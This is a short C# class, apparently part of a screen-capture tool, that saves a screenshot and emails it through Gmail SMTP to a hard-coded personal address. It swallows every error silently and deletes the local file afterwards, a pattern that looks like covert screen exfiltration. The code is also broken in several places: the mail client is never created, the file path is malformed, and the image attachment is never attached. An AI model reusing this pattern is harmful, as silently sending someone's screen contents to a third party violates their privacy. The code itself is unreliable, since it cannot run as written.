using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Net.Mime;

namespace sharp.ScreenCapturer.MailSender
{
    public class MailSender
    {
        private static string mailTo = "yegoryan.narek@gmail.com";
        private static string mailFrom = "";
        private SmtpClient client;
        private string path = Environment.SpecialFolder.MyDocuments + "\\picture" + DateTime.Now.ToShortDateString().Replace('/', '-');
        public MailSender()
        {
            client.Host = "smtp.gmail.com";
            client.Port = 587;
            client.Credentials = new NetworkCredential("", "");
            client.EnableSsl = true;
        }

        public void SendMail(Image img)
        {
            try
            {
                LinkedResource resource = new LinkedResource(path,
                    MediaTypeNames.Image.Jpeg);
                img.Save(path, ImageFormat.Jpeg);
                string htmlBody = "<html><body><h1>Picture</h1><br><img src=\"here\"></body></html>";
                var body = htmlBody.Replace("here", path);
                resource.ContentId = Guid.NewGuid().ToString();
                MailMessage mail = new MailMessage(mailFrom, mailTo);
                mail.Subject = string.Format(DateTime.Now.ToShortDateString() + "Screen Capture");
                mail.IsBodyHtml = true;
                mail.Body = body;
                client.Send(mail);
            }
            catch { }
            finally
            {
                File.Delete(path);
            }

        }
    }
}